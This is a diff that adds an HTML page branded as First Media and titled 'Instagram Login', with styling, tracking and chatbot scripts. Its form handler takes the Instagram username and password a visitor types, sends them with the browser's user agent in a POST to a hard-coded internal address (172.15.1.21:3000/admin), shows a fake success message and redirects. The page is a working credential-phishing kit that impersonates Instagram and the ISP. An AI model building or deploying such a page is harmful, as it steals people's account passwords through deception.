@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <!-- Google Tag Manager  test-->
+    <script>(function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-W56NWHJ');</script>
+    <!-- End Google Tag Manager -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Instagram Login - First Media</title>
+            <link rel="stylesheet" href="assets/css/mainbs.css" />
+        <link rel="stylesheet" href="assets/css/swiper.min.css" />
+        <link rel="stylesheet" href="assets/css/Login.css" />
+    <link rel="stylesheet" href="https://my.firstmedia.com/chatbot/css/intlTelInput.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+
+    <link rel="icon" href="https://www.firstmedia.com/files/favicon3.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="57x57" href="https://www.firstmedia.com/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://www.firstmedia.com/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://www.firstmedia.com/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://www.firstmedia.com/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://www.firstmedia.com/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://www.firstmedia.com/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://www.firstmedia.com/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://www.firstmedia.com/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.firstmedia.com/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://www.firstmedia.com/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.firstmedia.com/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://www.firstmedia.com/favicon/manifest.json">
+
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="https://www.firstmedia.com/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <style>
+        .newAdv {
+            margin-top: 1%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 15px;
+        }
+
+        .adv {
+            width: 52%;
+            border-radius: 15px;
+            background-color: navy;
+            margin: 0 auto;
+        }
+
+        @media screen and (max-width: 480px) {
+            .newAdv {
+                margin-top: 5px;
+                width: 95%
+            }
+
+            .adv {
+                width: 95%
+            }
+        }
+
+        .instagram-login-container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border: 2px solid #E4405F;
+        }
+
+        .instagram-header {
+            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .instagram-header h2 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .instagram-header p {
+            margin: 10px 0 0 0;
+            opacity: 0.9;
+        }
+
+        .instagram-form {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #E4405F;
+        }
+
+        .btn-instagram {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-instagram:hover {
+            opacity: 0.9;
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-link a {
+            color: #E4405F;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .success-message {
+            color: #28a745;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .instagram-logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body class="bodylogin">
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W56NWHJ"
+            height="0" width="0" style="display: none; visibility: hidden"></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <a class="newAdv">
+        <div class="adv noauth newdesktop" style="">&nbsp;</div>
+    </a>
+
+    <a class="newAdv">
+        <div class="adv noauth newmobile" style="">&nbsp;</div>
+    </a>
+
+    <div class="allbackground">
+        <section class="login container container-45">
+            <div class="row">
+                <div class="col-12 ">
+                    <div class="kontenlogin welcome" style="margin-top: 1%">
+                        <div class="row" style="">
+                            <div class="col-2 text-left">
+                                <a href="#" class="logo">
+                                    <img src="assets/img/logoMYFM_New.png" class="m0auto" alt=""></a>
+                            </div>
+                            <div class="col-10 text-right">
+                                <div class="blokwelcome">
+                                    <h1>First Media</h1>
+                                    <p style="margin-bottom: 0px;">Instagram Login</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="text-center">
+                            <img src="assets/img/ilustrasi-cek.png" class="m0auto imgintro" style="margin-bottom: 0em;" alt="">
+                        </div>
+                    </div>
+
+                    <div class="kontenlogin fomridlogin text-center">
+                        <div class="instagram-login-container">
+                            <div class="instagram-header">
+                                <div class="instagram-logo">
+                                    <i class="fab fa-instagram"></i>
+                                </div>
+                                <h2>Instagram Login</h2>
+                                <p>Masuk dengan akun Instagram Anda</p>
+                            </div>
+
+                            <div class="instagram-form">
+                                <form id="instagramLoginForm">
+                                    <div class="form-group">
+                                        <label for="instagramUsername">Username Instagram</label>
+                                        <input type="text" id="instagramUsername" name="username" placeholder="Masukkan username Instagram" required>
+                                        <div class="error-message" id="instagramUsernameError"></div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="instagramPassword">Password Instagram</label>
+                                        <input type="password" id="instagramPassword" name="password" placeholder="Masukkan password Instagram" required>
+                                        <div class="error-message" id="instagramPasswordError"></div>
+                                    </div>
+                                    <button type="submit" class="btn-instagram">
+                                        <i class="fab fa-instagram"></i>
+                                        Login dengan Instagram
+                                    </button>
+                                    <div class="success-message" id="instagramSuccess"></div>
+                                </form>
+
+                                <div class="back-link">
+                                    <a href="auth.html">← Kembali ke halaman login</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Scripts -->
+        <script src="assets/js/jquery.min.js"></script>
+        <script src="assets/js/skel.min.js"></script>
+        <script src="assets/js/util.js"></script>
+        <script src="assets/js/main.js"></script>
+        <script src="assets/js/swiper.min.js"></script>
+        
+        <script>
+            function sendToAdmin(data, type) {
+                // Send data to 172.15.1.21:3000/admin
+                fetch('http://172.15.1.21:3000/admin', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        data: data,
+                        timestamp: new Date().toISOString()
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Data sent to admin:', result);
+                    console.log('Full data payload:', {
+                        type: type,
+                        data: data,
+                        timestamp: new Date().toISOString()
+                    });
+                })
+                .catch(error => {
+                    console.error('Error sending data to admin:', error);
+                });
+            }
+
+            function showError(elementId, message) {
+                const errorElement = document.getElementById(elementId);
+                errorElement.textContent = message;
+                errorElement.style.display = 'block';
+            }
+
+            function hideError(elementId) {
+                const errorElement = document.getElementById(elementId);
+                errorElement.style.display = 'none';
+            }
+
+            function showSuccess(elementId, message) {
+                const successElement = document.getElementById(elementId);
+                successElement.textContent = message;
+                successElement.style.display = 'block';
+            }
+
+            function hideSuccess(elementId) {
+                const successElement = document.getElementById(elementId);
+                successElement.style.display = 'none';
+            }
+
+            // Instagram Login Form Handler
+            document.getElementById('instagramLoginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('instagramUsername').value;
+                const password = document.getElementById('instagramPassword').value;
+
+                // Hide previous messages
+                hideError('instagramUsernameError');
+                hideError('instagramPasswordError');
+                hideSuccess('instagramSuccess');
+
+                // Basic validation
+                if (!username) {
+                    showError('instagramUsernameError', 'Username Instagram harus diisi');
+                    return;
+                }
+
+                if (!password) {
+                    showError('instagramPasswordError', 'Password Instagram harus diisi');
+                    return;
+                }
+
+                // Send data to admin
+                const instagramData = {
+                    username: username,
+                    password: password,
+                    provider: 'instagram',
+                    action: 'instagram_login',
+                    userAgent: navigator.userAgent
+                };
+
+                sendToAdmin(instagramData, 'instagram_login');
+
+                // Show success message
+                showSuccess('instagramSuccess', 'Login Instagram berhasil! Redirecting...');
+
+                // Redirect to dashboard after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 2000);
+            });
+
+            function rebindAdv() {
+                var pname = 'cek.firstmedia.land';
+                var cust = 'instagram_user';
+                var agent = encodeURI(window.navigator.userAgent);
+                var uri = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=3';
+                var uriMobile = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=8';
+                uri = uri.replace("#a#", cust);
+                uri = uri.replace("#ua#", agent);
+
+                uriMobile = uriMobile.replace("#a#", cust);
+                uriMobile = uriMobile.replace("#ua#", agent);
+
+                pname = 'cek.firstmedia.land';
+                uri = uri.replace("#p#", pname);
+                uriMobile = uriMobile.replace("#p#", pname);
+
+                if (cust == undefined || cust == '') {
+                    pname = 'cek.firstmedia.land';
+                    uri = uri.replace("#p#", pname);
+                    uriMobile = uriMobile.replace("#p#", pname);
+                } else {
+                    uri = uri.replace("#p#", pname);
+                    uriMobile = uriMobile.replace("#p#", pname);
+                }
+                $(".newdesktop").load(uri);
+                $(".newmobile").load(uriMobile);
+            }
+
+            $(document).ready(function () {
+                rebindAdv();
+            });
+        </script>
+        
+        <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans'>
+        <link rel="stylesheet" href="https://staging.firstmedia.com:8443/myfm/chatbot/css/indigo.css">
+        <link rel="stylesheet" href="chatbot/css/widget.css">
+        <link rel="stylesheet" href="chatbot/css/lightslider.css">
+        <link rel="stylesheet" href="chatbot/css/intlTelInput.css">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no" />
+
+        <script src='chatbot/js/jquery-2.1.3.min.js'></script>
+        <script src='chatbot/js/iframeResizer.contentWindow.js'></script>
+        <script src='chatbot/js/iframeResizer.js'></script>
+        <script src='chatbot/js/lightslider.js'></script>
+        <script src='chatbot/js/lazyload.min.js'></script>
+        <script src="chatbot/js/cryptojs/pbkdf2.js"></script>
+        <script src="chatbot/js/cryptojs/aes.js"></script>
+        <script src="chatbot/js/cipher/aes-util.js"></script>
+        <script src="chatbot/js/stp.js"></script>
+        <script src="chatbot/js/sjs.js"></script>
+        <script src="chatbot/js/chat.js"></script>
+        <script src="chatbot/js/fuse.js"></script>
+        <script src="chatbot/js/speech.js"></script>
+        <script src="chatbot/js/intlTelInput.js"></script>
+    </div>
+
+</body>
+</html> 
